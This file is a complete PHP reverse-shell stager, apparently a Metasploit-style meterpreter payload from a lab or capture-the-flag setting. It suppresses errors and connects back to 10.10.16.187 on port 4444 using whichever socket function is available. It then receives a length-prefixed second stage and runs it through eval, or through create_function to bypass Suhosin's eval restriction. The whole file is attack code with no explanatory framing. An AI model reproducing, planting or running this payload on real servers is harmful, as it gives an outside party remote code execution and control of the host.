/*
<?php /**/error_reporting(0);
$ip = '10.10.16.187';
$port = 4444;
if (($f = 'stream_socket_client') && is_callable($f)) {
    $s = $f("tcp://{$ip}:{$port}");
    $s_type = 'stream';
}
if (!$s && ($f = 'fsockopen') && is_callable($f)) {
    $s = $f($ip, $port);
    $s_type = 'stream';
}
if (!$s && ($f = 'socket_create') && is_callable($f)) {
    $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
    $res = @socket_connect($s, $ip, $port);
    if (!$res) {
        die();
    }
    $s_type = 'socket';
}
if (!$s_type) {
    die('no socket funcs');
}
if (!$s) {
    die('no socket');
}
switch ($s_type) {
    case 'stream':
        $duzina = fread($s, 4);
        break;
    case 'socket':
        $duzina = socket_read($s, 4);
        break;
}
if (!$duzina) {
    die();
}
$a = unpack("Nlen", $duzina);
$duzina = $a['len'];
$b = '';
while (strlen($b) < $duzina) {
    switch ($s_type) {
        case 'stream':
            $b .= fread($s, $duzina - strlen($b));
            break;
        case 'socket':
            $b .= socket_read($s, $duzina - strlen($b));
            break;
    }
}
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
if (!(extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))) {
    eval($b);
} else {
    $suhosin_bypass = create_function('', $b);
    $suhosin_bypass();
}
die();